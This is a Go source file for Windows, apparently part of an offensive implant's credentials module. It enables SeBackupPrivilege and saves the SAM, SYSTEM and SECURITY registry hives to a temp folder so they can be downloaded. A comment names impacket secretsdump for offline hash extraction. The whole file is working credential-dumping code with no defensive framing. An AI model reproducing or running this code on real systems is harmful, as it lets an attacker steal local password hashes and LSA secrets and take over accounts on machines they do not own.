//go:build windows && amd64

package credentials

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"
)

// SAMDumpResult 是 SAM/SYSTEM hive 转储结果。
type SAMDumpResult struct {
	SAMPath    string `json:"sam_path"`
	SYSTEMPath string `json:"system_path"`
	SecurityPath string `json:"security_path,omitempty"`
	Success    bool   `json:"success"`
	Error      string `json:"error,omitempty"`
}

// DumpSAM 通过 RegSaveKey 将 SAM/SYSTEM hive 保存为文件，供离线解析。
// 需要 SeBackupPrivilege 权限（通常由 SYSTEM 或管理员持有）。
//
// 离线解析：impacket secretsdump.py -sam sam.hive -system system.hive LOCAL
func DumpSAM() (*SAMDumpResult, error) {
	result := &SAMDumpResult{}

	// Enable SeBackupPrivilege
	if err := enableBackupPrivilege(); err != nil {
		result.Error = fmt.Sprintf("enable backup privilege: %v", err)
		return result, err
	}

	// Create temp directory for hives
	tmpDir := os.TempDir()
	hiveDir := filepath.Join(tmpDir, "aegis_hives")
	if err := os.MkdirAll(hiveDir, 0755); err != nil {
		result.Error = fmt.Sprintf("create temp dir: %v", err)
		return result, err
	}
	// Caller is responsible for cleanup after downloading hive files.

	samPath := filepath.Join(hiveDir, "sam.hive")
	systemPath := filepath.Join(hiveDir, "system.hive")
	securityPath := filepath.Join(hiveDir, "security.hive")

	// Save SAM hive
	if err := saveRegistryHive(`SAM\SAM`, samPath); err != nil {
		result.Error = fmt.Sprintf("save SAM: %v", err)
		result.SAMPath = ""
		result.SYSTEMPath = ""
		return result, err
	}
	result.SAMPath = samPath

	// Save SYSTEM hive
	if err := saveRegistryHive(`SYSTEM`, systemPath); err != nil {
		result.Error = fmt.Sprintf("save SYSTEM: %v", err)
		return result, err
	}
	result.SYSTEMPath = systemPath

	// Save SECURITY hive (contains LSA secrets)
	if err := saveRegistryHive(`SECURITY`, securityPath); err == nil {
		result.SecurityPath = securityPath
	}

	result.Success = true
	return result, nil
}

// saveRegistryHive 使用 RegSaveKeyW 将注册表 hive 保存到文件。
func saveRegistryHive(keyPath, filePath string) error {
	// Open the key (HKEY_LOCAL_MACHINE\keyPath)
	keyUTF16, err := syscall.UTF16PtrFromString(keyPath)
	if err != nil {
		return err
	}

	var hKey syscall.Handle
	ret, _, _ := procRegOpenKeyExW.Call(
		uintptr(syscall.HKEY_LOCAL_MACHINE),
		uintptr(unsafe.Pointer(keyUTF16)),
		0,
		uintptr(KEY_READ),
		uintptr(unsafe.Pointer(&hKey)),
	)
	if ret != 0 {
		return fmt.Errorf("RegOpenKeyEx(%s) failed: %d", keyPath, ret)
	}
	defer procRegCloseKey.Call(uintptr(hKey))

	// Create the output file (RegSaveKey requires the file to NOT exist)
	fileUTF16, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}

	// RegSaveKeyW — uses the security descriptor of the calling thread
	// lpSecurityDescriptor = NULL (default)
	ret, _, _ = procRegSaveKeyW.Call(
		uintptr(hKey),
		uintptr(unsafe.Pointer(fileUTF16)),
		0, // NULL security descriptor
	)
	if ret != 0 {
		return fmt.Errorf("RegSaveKey(%s -> %s) failed: %d", keyPath, filePath, ret)
	}

	return nil
}

// enableBackupPrivilege 启用 SeBackupPrivilege。
func enableBackupPrivilege() error {
	var token syscall.Token
	procHandle, _ := syscall.GetCurrentProcess()
	ret, _, _ := procOpenProcessToken.Call(
		uintptr(procHandle),
		uintptr(TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY),
		uintptr(unsafe.Pointer(&token)),
	)
	if ret == 0 {
		return fmt.Errorf("OpenProcessToken failed")
	}
	defer syscall.CloseHandle(syscall.Handle(token))

	// LUID for SeBackupPrivilege
	var luid LUID
	ret, _, _ = procLookupPrivilegeValueW.Call(
		0, // NULL = local system
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("SeBackupPrivilege"))),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		return fmt.Errorf("LookupPrivilegeValue SeBackupPrivilege failed")
	}

	// Enable the privilege
	tokenPrivs := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, lastErr := procAdjustTokenPrivileges.Call(
		uintptr(token),
		0, // FALSE = disable all = NO, we're enabling
		uintptr(unsafe.Pointer(&tokenPrivs)),
		0,
		0,
		0,
	)
	// P2-3: AdjustTokenPrivileges can return non-zero even when it partially
	// fails. Check GetLastError for ERROR_NOT_ALL_ASSIGNED (1300).
	if ret == 0 {
		return fmt.Errorf("AdjustTokenPrivileges failed: %v", lastErr)
	}
	const ERROR_NOT_ALL_ASSIGNED = 1300
	if lastErr.(syscall.Errno) == ERROR_NOT_ALL_ASSIGNED {
		return fmt.Errorf("AdjustTokenPrivileges: not all privileges assigned")
	}

	return nil
}

// === Windows API constants and procs ===

const (
	KEY_READ                  = 0x20019
	TOKEN_ADJUST_PRIVILEGES   = 0x0020
	TOKEN_QUERY               = 0x0008
	SE_PRIVILEGE_ENABLED      = 0x00000002
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

var (
	modAdvapi32 = syscall.NewLazyDLL("advapi32.dll")

	procRegOpenKeyExW       = modAdvapi32.NewProc("RegOpenKeyExW")
	procRegSaveKeyW         = modAdvapi32.NewProc("RegSaveKeyW")
	procRegCloseKey         = modAdvapi32.NewProc("RegCloseKey")
	procOpenProcessToken    = modAdvapi32.NewProc("OpenProcessToken")
	procLookupPrivilegeValueW = modAdvapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = modAdvapi32.NewProc("AdjustTokenPrivileges")
)
